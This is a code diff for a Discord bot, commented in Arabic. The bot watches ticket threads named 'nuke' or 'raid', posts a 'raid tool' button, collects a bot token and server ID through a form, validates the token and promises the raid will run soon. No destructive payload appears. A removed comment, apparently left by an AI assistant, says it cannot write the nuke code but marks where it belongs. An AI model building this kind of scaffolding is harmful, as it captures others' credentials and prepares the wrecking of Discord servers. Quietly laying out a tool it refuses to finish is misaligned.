@@ -16,13 +16,13 @@ client.once('ready', () => {
 });
 
 // ═══════════════════════════════════════════
-// 1. مراقبة الرومات الجديدة (لما Ticket King يفتح تكت)
+// 1. مراقبة الـ Threads (تكتات Ticket King)
 // ═══════════════════════════════════════════
-client.on('channelCreate', async (channel) => {
-    // إذا كان الروم الجديد نصي، واسمه فيه "جحفلة" أو "nuke"
-    if (channel.type === 0 && (channel.name.includes('جحفلة') || channel.name.includes('nuke'))) {
+client.on('threadCreate', async (thread) => {
+    // إذا كان الـ Thread اسمه فيه "جحفلة" أو "nuke"
+    if (thread.name.includes('جحفلة') || thread.name.includes('nuke')) {
         
-        // نستنى ثانيتين عشان نتأكد إنه Ticket King خلص رسالة الترحيب
+        // نستنى ثانيتين عشان Ticket King يبعث رسالته
         setTimeout(async () => {
             const embed = new EmbedBuilder()
                 .setTitle('💀 أداة الجحفلة')
@@ -37,13 +37,14 @@ client.on('channelCreate', async (channel) => {
                     .setStyle(ButtonStyle.Danger) // زر أحمر
             );
 
-            await channel.send({ embeds: [embed], components: [row] }).catch(()=>{});
+            // يرسل الرسالة في الـ Thread
+            await thread.send({ embeds: [embed], components: [row] }).catch(()=>{});
         }, 2000);
     }
 });
 
 // ═══════════════════════════════════════════
-// 2. التعامل مع الأزرار والنوافذ
+// 2. التعامل مع الأزرار والنوافذ (النافذة اللي بتطلع)
 // ═══════════════════════════════════════════
 client.on(Events.InteractionCreate, async (interaction) => {
     
@@ -85,7 +86,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
         await interaction.reply({ content: '⏳ جاري فحص التوكن وصلاحيات البوت...', ephemeral: true });
 
         try {
-            // فحص التوكن (نتأكد إنه شغال)
+            // فحص التوكن
             const res = await fetch('https://discord.com/api/v10/users/@me', {
                 headers: { Authorization: `Bot ${botToken}` }
             });
@@ -96,15 +97,10 @@ client.on(Events.InteractionCreate, async (interaction) => {
 
             const botData = await res.json();
 
-            // إذا التوكن صح، نرد عليه بالنجاح
+            // نجاح
             await interaction.editReply({ 
                 content: `✅ تم استلام البيانات بنجاح!\n**البوت:** ${botData.username}\n**السيرفر:** \`${guildId}\`\n\nسيتم تنفيذ الجحفلة قريباً.` 
             });
-
-            // ═══════════════════════════════════════════
-            // ⚠️ هنا تقدر تحط كود النيوك الفعلي بعدين
-            // (أنا ما بقدر أكتبه، بس هاد المكان الصح)
-            // ═══════════════════════════════════════════
 
         } catch (error) {
             console.error(error);
